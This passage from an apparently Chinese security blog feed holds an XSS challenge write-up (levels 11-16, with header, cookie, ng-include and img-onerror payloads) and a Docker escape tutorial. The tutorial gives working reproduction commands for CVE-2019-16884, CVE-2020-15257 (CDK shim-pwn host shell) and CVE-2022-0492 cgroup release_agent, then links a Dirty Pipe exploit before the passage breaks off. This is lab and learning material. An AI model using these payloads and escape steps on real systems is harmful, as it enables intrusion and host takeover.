title=""></a></h6><p>查看源码，发现第15行大小于号被转义、双引号都被转义，语句采用双引号闭合，在第17、18、19、20行，发现另外四个输入参数，分别是t_link、t_history、t_sort、t_ref，考虑将测试语句传入进行测试</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-11.png" class="" title="2024-02-29_11-11.png"><h6 id="-37"><a href="#-37" class="headerlink" title=""></a></h6><p>构造访问</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?t_history=<span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span><span class="language-javascript">&amp;t_sort=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span>&amp;t_link=<span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span></span></span>&amp;t_ref=<span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;&#x27;/<span class="hljs-attr">0n</span>&gt;</span></span></span></span></span><br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-12.png" class="" title="2024-02-29_11-12.png"><h6 id="-38"><a href="#-38" class="headerlink" title=""></a></h6><p>可以看到大小于号被转义、双引号都被转义，语句采用双引号闭合，然后我尝试了很多绕过都不行，终究还是太菜了…尝试其余参数入手试试吧，可以发现其余参通过url地址栏传递无法传递，这时候就在想t_ref根据命令规则是不是就是http的referer头部信息，抓包尝试一下,发现没有任何过滤</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-14.png" class="" title="2024-02-29_11-14.png"><h6 id="-39"><a href="#-39" class="headerlink" title=""></a></h6><p>okkkk，那就直接改referer头部信息，但是没有..手动加个referer<br>pass!</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">referer:</span> referer:click me!<span class="hljs-string">&quot; type=&quot;</span>button<span class="hljs-string">&quot; onclick=&quot;</span>alert(<span class="hljs-keyword">/xss/</span>)<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-16.png" class="" title="2024-02-29_11-16.png"><h6 id="-40"><a href="#-40" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_11-20.png" class="" title="2024-02-29_11-20.png"><h6 id="-41"><a href="#-41" class="headerlink" title=""></a></h6><p>第十二关<br>与关卡11类似，修改t_ua值进行绕过，也就是修改数据包中的UA头，不再多说</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_12-21.png" class="" title="2024-02-29_12-21.png"><h6 id="-42"><a href="#-42" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_12-21_1.png" class="" title="2024-02-29_12-21_1.png"><h6 id="-43"><a href="#-43" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-13.png" class="" title="2024-02-29_13-13.png"><h6 id="-44"><a href="#-44" class="headerlink" title=""></a></h6><p>第十三关<br>与关卡11、12类似，修改值进行绕过，也不再多说</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-13_1.png" class="" title="2024-02-29_13-13_1.png"><h6 id="-45"><a href="#-45" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-14.png" class="" title="2024-02-29_13-14.png"><h6 id="-46"><a href="#-46" class="headerlink" title=""></a></h6><p>payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">Cookie:</span> <span class="hljs-attr">user</span><span class="hljs-operator">=</span>click me!<span class="hljs-string">&quot; type=&quot;</span>button<span class="hljs-string">&quot; onclick=&quot;</span>alert(<span class="hljs-keyword">/xss/</span>)<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-16.png" class="" title="2024-02-29_13-16.png"><h6 id="-47"><a href="#-47" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-17.png" class="" title="2024-02-29_13-17.png"><h6 id="-48"><a href="#-48" class="headerlink" title=""></a></h6><p>第十四关<br>额…第十四关咋啥东西也没有，就一个跳转，还是404！！源码也没啥东西，我也不知道是要考啥，捣鼓半天放弃..直接下一题吧</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-19.png" class="" title="2024-02-29_13-19.png"><h6 id="-49"><a href="#-49" class="headerlink" title=""></a></h6><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-19_1.png" class="" title="2024-02-29_13-19_1.png"><h6 id="-50"><a href="#-50" class="headerlink" title=""></a></h6><p>第十五关<br>分析源码发现URL的src参数回显在下面的ng-include</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-22_1.png" class="" title="2024-02-29_13-22_1.png"><h6 id="-51"><a href="#-51" class="headerlink" title=""></a></h6><p>ng-include相当于php的include函数，所以我们只要包含一个有XSS漏洞的URL就可触发这里的XSS，那我们这里包含第一关的XSS试试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-24.png" class="" title="2024-02-29_13-24.png"><h6 id="-52"><a href="#-52" class="headerlink" title=""></a></h6><p>第十六关<br>在url中输入测试语句，可以看到script被过滤了</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-24_1.png" class="" title="2024-02-29_13-24_1.png"><h6 id="-53"><a href="#-53" class="headerlink" title=""></a></h6><p>可以看到script被过滤了、并且空格和&#x2F;被转义了</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-26.png" class="" title="2024-02-29_13-26.png"><h6 id="-54"><a href="#-54" class="headerlink" title=""></a></h6><p>用img绕过并且空格用%0a替换</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?keyword<span class="hljs-operator">=</span>&lt;img<span class="hljs-variable">%0</span>asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>aonerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-27.png" class="" title="2024-02-29_13-27.png"><h6 id="-55"><a href="#-55" class="headerlink" title=""></a></h6><p>到了下一关发现提示“该插件不支持”，这时候我盲猜应该是考Flash XSS，既然提示我没有且加载不出来，那就到此为止吧，也不知道后面有多少关，本来一开始就是打着做着玩的心态，打发一下时间，也就不在这上面浪费时间了，说不定哪天又碰到了或者想起来了，到时候再搞搞玩吧！嗯嗯..就这样</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_13-32.png" class="" title="2024-02-29_13-32.png"><h6 id="-56"><a href="#-56" class="headerlink" title=""></a></h6><p>继续刷我抖音了～#$%@……^&amp;*(-+)😊</p>]]></content>
    
    
    <categories>
      
      <category>Game</category>
      
    </categories>
    
    
    <tags>
      
      <tag>game time</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker安全（二）</title>
    <link href="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>继上一篇，在（一）中，总结了常用的docker环境的判断和信息收集，以及常用的三种逃逸方式：Priviliged 特权模式逃逸、挂载宿主机 procfs 逃逸、挂载 Docker Socket 逃逸，本文将总结一些通过docker自身漏洞以及安全配置不当造成的逃逸或者其他渗透利用方式</p><h2 id="CVE-2019-16884"><a href="#CVE-2019-16884" class="headerlink" title="CVE-2019-16884"></a>CVE-2019-16884</h2><p>攻击者可以在容器镜像中可以声明一个VOLUME并挂载至&#x2F;proc，之后欺骗runc使其认为AppArmor已经成功应用从而绕过AppArmor策略<br>（runc是一个根据OCI规范实现的CLI工具，用于生成和运行容器，docker的runtime使用的就是runc）</p><p>影响版本：runc &lt;&#x3D; 1.0.0-rc8</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-15_11-47.png" class="" title="2024-02-15_11-47.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>首先创建apparmor规则</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;tunables/global&gt;</span><br><br>profile no_flag flags=(attach_disconnected,mediate_deleted) &#123;<br>  <span class="hljs-meta">#<span class="hljs-keyword">include</span> &lt;abstractions/base&gt;</span><br>  file,<br>  deny /<span class="hljs-built_in">flag</span> r,<br>&#125;<br></code></pre></td></tr></table></figure><p>（注：如果docker环境中不能使用vim,可以使用cat+EOF）<br>随后创建一个flag文件，以证实逃逸是否成功</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-15_11-49.png" class="" title="2024-02-15_11-49.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>再对刚才创建的规则进行应用</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/sbin/apparmor_parser</span> <span class="hljs-params">--replace</span> <span class="hljs-params">--write-cache</span> <span class="hljs-string">/etc/apparmor.d/no_flag</span><br></code></pre></td></tr></table></figure><p>这个时候如果我们启动一个正常镜像并尝试读取flag是报错的，会提示无权限读取flag内容，这个时候我们就可以利用漏洞启动一个恶意镜像，来读取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p rootfs/proc/self/&#123;attr,fd&#125;<br><span class="hljs-built_in">touch</span> rootfs/proc/self/&#123;status,attr/exec&#125;<br><span class="hljs-built_in">touch</span> rootfs/proc/self/fd/&#123;4,5&#125;<br><br><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF &gt; Dockerfile</span><br><span class="hljs-string">FROM busybox</span><br><span class="hljs-string">ADD rootfs /</span><br><span class="hljs-string"></span><br><span class="hljs-string">VOLUME /proc</span><br><span class="hljs-string">EOF</span><br><br>docker build -t apparmor-bypass .<br>docker run --<span class="hljs-built_in">rm</span> --security-opt <span class="hljs-string">&quot;apparmor=no_flag&quot;</span> -v /tmp/flag:/flag apparmor-bypass <span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><p>逃逸成功，并成功读取宿主机文件</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_11-03.png" class="" title="2024-02-16_11-03.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><h2 id="CVE-2020-15257"><a href="#CVE-2020-15257" class="headerlink" title="CVE-2020-15257"></a>CVE-2020-15257</h2><p>containerd是行业标准的容器运行时，可作为Linux和Windows的守护程序使用。在版本1.3.9和1.4.3之前的容器中，容器填充的API不正确地暴露给主机网络容器。填充程序的API套接字的访问控制验证了连接过程的有效UID为0，但没有以其他方式限制对抽象Unix域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效UID为0，但特权降低）导致新进程以提升的特权运行，总结来说，攻击者可以使容器与宿主机处于同一网络命名空间，从而突破容器命名空间隔离，实现容器逃逸</p><p>影响版本：containerd &lt; 1.4.3、containerd &lt; 1.3.9</p><h3 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h3><p>containerd-shim：<br>夹杂在containerd和runc之间，每次启动一个容器，都会创建一个新的containerd-shim进程，它通过指定的三个参数：容器id、bundle目录、运行时二进制文件路径，来调用运行时的API创建、运行容器，持续存在到容器实例进程退出为止，将容器的退出状态反馈给containerd</p><p>Unix套接字：<br>在Linux系统中，有一种Unix域套接字，可以用于同一个主机上的进程之间进行通信，它的API调用方法和普通的TCP&#x2F;IP的套接字一样，也是调用socket函数创建一个套接字，域设置成AF_UNIX，套接字的类型可以是流套接字（SOCK_STREAM）和数据报套接字（SOCK_DGRAM）</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">Unix域流套接字：<br><span class="hljs-built_in">socket</span>(AF_UNIX,  SOCK_STREAM, <span class="hljs-number">0</span>);<br>Unix域数据报套接字：<br><span class="hljs-built_in">socket</span>(AF_UNIX,SOCK_DGRAM,  <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>docker网络模式：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm">（<span class="hljs-number">1</span>）none：这种模式下容器内部只有loopback回环网络，没有其他网卡，不能访问外网，完全封闭的网络；<br>（<span class="hljs-number">2</span>）container：指定一个已经存在的容器名字，新的容器会和这个已经存在的容器共享一个网络命名空间，<span class="hljs-built_in">IP</span>、端口范围也一起在这两个容器中共享；<br>（<span class="hljs-number">3</span>）bridge：这是docker默认的网络模式，会为每一个容器分配网络命名空间，设置<span class="hljs-built_in">IP</span>，保证容器内的进程使用独立的网络环境，使得容器和容器之间、容器和主机之间实现网络隔离；<br>（<span class="hljs-number">4</span>）host：这种模式下，容器和主机已经没有网络隔离了，它们共享同一个网络命名空间，容器的网络配置和主机完全一样，使用主机的<span class="hljs-built_in">IP</span>地址和端口，可以查看到主机所有网卡信息、网络资源，在网络性能上没有损耗。但也正是因为没有网络隔离，容器和主机容易产生网络资源冲突、争抢，以及其他的一些问题安全隐患问题<br></code></pre></td></tr></table></figure><p>(在使用docker run命令创建并运行容器时，可以使用–network选项指定容器的网络模式)</p><p>每次启动一个容器时，containerd会创建一个新的containerd-shim进程，由containerd-shim进程（而不是containerd）来直接控制容器的整个生命周期，而containerd在创建containerd-shim之前，会创建一个Unix域套接字，containerd传递Unix域套接字文件描述符给containerd-shim。containerd-shim在正式启动之后，会基于父进程（也就是containerd）传递的Unix域套接字文件描述符，建立gRPC服务，对外暴露一些API用于container、task的控制，此时，containerd-shim做为server向外提供服务，containerd做为client，调用containerd-shim提供的API实现对容器的间接管理，而抽象Unix域套接字没有权限限制，所以只能靠连接进程的UID、GID做访问控制，限定了只能是root（UID&#x3D;0，GID&#x3D;0）用户才能连接成功。通过访问&#x2F;proc&#x2F;net&#x2F;unix文件，可以获取到当前网络命名空间下所有的Unix域套接字信息，在默认情况下，docker run启动的容器的网络模式是bridge，容器和主机之间实现了网络隔离，所以在容器内部读取&#x2F;proc&#x2F;net&#x2F;unix文件，看不到任何信息</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-05.png" class="" title="2024-02-17_09-05.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>但是在host模式下，由于容器和主机共享同一个网络命名空间，容器能访问到主机中的所有网络资源，所以在容器内部读取&#x2F;proc&#x2F;net&#x2F;unix文件，显示的就是真实主机中的信息</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-05_1.png" class="" title="2024-02-17_09-05_1.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_15-24.png" class="" title="2024-02-16_15-24.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>首先下载容器，并使用host网络模式启动，进入docker之后进行记下id号，后面会用到</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_16-18.png" class="" title="2024-02-16_16-18.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>接下来就要搬出我们大名鼎鼎的CDK，一款专门为K8s、Docker 和 Containerd 打造的的安全测试（<a href="https://github.com/cdk-team/CDK%EF%BC%89">https://github.com/cdk-team/CDK）</a><br>这里我们将下载好的压缩包解压，然后直接copy id号，将工具传入到docker容器</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_16-32.png" class="" title="2024-02-16_16-32.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>进入容器，在容器内执行exp，同时攻击机设置监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it <span class="hljs-built_in">id</span>号 /bin/bash<br>./cdk_linux_amd64 run shim-pwn 127.0.0.1 9999<br></code></pre></td></tr></table></figure><p>成功完成逃逸获得宿主机的shell</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-16_17-43.png" class="" title="2024-02-16_17-43.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><h2 id="CVE-2022-0492"><a href="#CVE-2022-0492" class="headerlink" title="CVE-2022-0492"></a>CVE-2022-0492</h2><p>漏洞发生的点在于对修改cgroup 的release_agent缺失权限校验，导致给逃逸利用的门槛进一步降低(以前需要CAP_SYS_ADMIN权限，该漏洞无需CAP_SYS_ADMIN)，当容器没有开启额外安全措施时，获得容器内root权限即可逃逸到宿主机<br>漏洞产品: linux kernel - cgroup</p><h3 id="知识补充-1"><a href="#知识补充-1" class="headerlink" title="知识补充"></a>知识补充</h3><p>cgroup:<br>cgroup 即Linux Control Group， 是Linux内核的一个功能，用来限制，控制与分离一个进程组群的资源(如CPU、内存、磁盘输入输出等)<br>cgroup 有如下子系统:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mel">devices <span class="hljs-comment">//进程范围设备权限</span><br>cpuset <span class="hljs-comment">//分配进程可使用的 CPU数和内存节点</span><br>cpu <span class="hljs-comment">//控制CPU占有率</span><br>cpuacct <span class="hljs-comment">//统计CPU使用情况，例如运行时间，throttled时间</span><br><span class="hljs-keyword">memory</span> <span class="hljs-comment">//限制内存的使用上限</span><br>freezer <span class="hljs-comment">//暂停 Cgroup 中的进程</span><br>net_cls <span class="hljs-comment">//配合 tc(traffic controller)限制网络带宽</span><br>net_prio <span class="hljs-comment">//设置进程的网络流量优先级</span><br>huge_tlb <span class="hljs-comment">//限制 HugeTLB 的使用</span><br>perf_event <span class="hljs-comment">//允许 Perf 工具基于 Cgroup 分组做性能检测</span><br></code></pre></td></tr></table></figure><p>宿主机中的cgroup 都在&#x2F;sys&#x2F;fs&#x2F;cgroup 下，可以看到各个cgroup 子系统</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-45.png" class="" title="2024-02-17_09-45.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>docker 中对应的cgroup 子系统就是宿主机中该cgroup 的子节点，docker中查看memory cgroup<br>如果一个服务器有一个普通的用户，并且这个用户加入了 docker 组，则这个用户已经是 root 了</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-45_1.png" class="" title="2024-02-17_09-45_1.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>主机docker 目录中的对应容器名节点，一模一样</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-46.png" class="" title="2024-02-17_09-46.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>release_agent:<br>cgroup的每一个subsystem都有参数notify_on_release，这个参数值是Boolean型，1或0。分别可以启动和禁用释放代理的指令。如果notify_on_release启用(为1)，当cgroup不再包含任何任务时（即cgroup中最后一个进程退出的时候，cgroup的tasks文件里的PID为空时），系统内核会执行release_agent参数指定的文件里的内容.通过修改notify_on_release 文件的形势修改notify_on_release的值</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-50.png" class="" title="2024-02-17_09-50.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>漏洞发生就位于对release_agent 的修改，在原本只要可以操作cgroup 便可对release_agent 进行修改，而需要CAP_SYS_ADMIN才可以使用cgroup。但后来有人研究发现通过unshare命令创建新的namespace可以获得全部的capbilities，那么对于CAP_SYS_ADMIN 的限制就不存在了，漏洞利用的门槛一下子降低了很多</p><p>unshare命令：<br>unshare 命令功能为取消指定的共享父进程中指定的命名空间，然后执行指定的程序并加入新创建的namespace。和我们漏洞利用相关的就是，unshare 新创建的namespace 拥有包括CAP_SYS_ADMIN在内的全部的capbilities</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-39.png" class="" title="2024-02-17_09-39.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在存在漏洞版本的内核的linux中使用docker 即可，我这里直接使用metarget搭建环境</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-21.png" class="" title="2024-02-17_09-21.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>带有 sys_admin 启动 Docker， 关闭 apparmor</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> --rm -it <span class="hljs-attribute">--cap-add</span>=SYS_ADMIN <span class="hljs-attribute">--security-opt</span>=<span class="hljs-string">&quot;apparmor=unconfined&quot;</span> ubuntu:20.04 /bin/bash<br></code></pre></td></tr></table></figure><p>上面是带有 CAP_SYS_ADMIN 权限的 Docker，当进行mount 的时候会主动加载 release_agent<br>进入 Docker 内部，首先挂载 cgroup</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-29.png" class="" title="2024-02-17_09-29.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>修改 release_agent 触发逃逸，将 notify_on_release 设置为1，开启 task 进程清空后执行 release_agent 功能</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/tmp/</span>testcgroup<span class="hljs-regexp">/x/</span>notify_on_release<br></code></pre></td></tr></table></figure><p>创建 release_agent 触发时执行的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> /cmd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/sh&#x27;</span> &gt; /cmd<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ps -ef &gt;&gt; <span class="hljs-variable">$host_path</span>/result&quot;</span>  &gt;&gt; /cmd<br><span class="hljs-built_in">chmod</span> 777 /cmd<br></code></pre></td></tr></table></figure><p>修改release_agent ，指向 cmd 文件在宿主机中的路径（上面已经获取了容器根目录在宿主机中的路径）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$host_path</span>/cmd&quot;</span> &gt; /tmp/testcgroup/release_agent<br></code></pre></td></tr></table></figure><p>接下来向 x cgroup 节点中输入一个任务，将自己所属的 sh 的pid 写入 cgroup.procs</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sh <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;echo \<span class="hljs-variable">$</span>\<span class="hljs-variable">$</span> &gt;  /tmp/testcgroup/x/cgroup.procs&quot;</span><br></code></pre></td></tr></table></figure><p>sh 命令只执行了一个 echo 指令，一瞬间就会结束，那么 x cgroup 节点中就 &#x2F; 没有任何任务了，触发 notify_on_release 执行 release_agent 指向的 &#x2F;cmd 文件，内核触发，在容器外执行我们指定的命令，完成逃逸</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-32.png" class="" title="2024-02-17_09-32.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_09-33.png" class="" title="2024-02-17_09-33.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><h2 id="从脏管道到Docker逃逸"><a href="#从脏管道到Docker逃逸" class="headerlink" title="从脏管道到Docker逃逸"></a>从脏管道到Docker逃逸</h2><h3 id="脏管道介绍"><a href="#脏管道介绍" class="headerlink" title="脏管道介绍"></a>脏管道介绍</h3><p>提到脏管道，就不得不说CVE-2022-0847，它是一个是存在于 Linux 内核 5.8 及之后版本中的本地提权漏洞，攻击者通过利用此漏洞，可覆盖重写任意可读文件中的数据，从而可将普通权限的用户提升到特权 root，漏洞原理类似于 CVE-2016-5195 脏牛漏洞（Dirty Cow），但它更容易被利用。漏洞作者将此漏洞命名为 Dirty Pipe（脏管道）</p><p>漏洞利用：<br>exp: <a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git">https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git</a><br>     <a 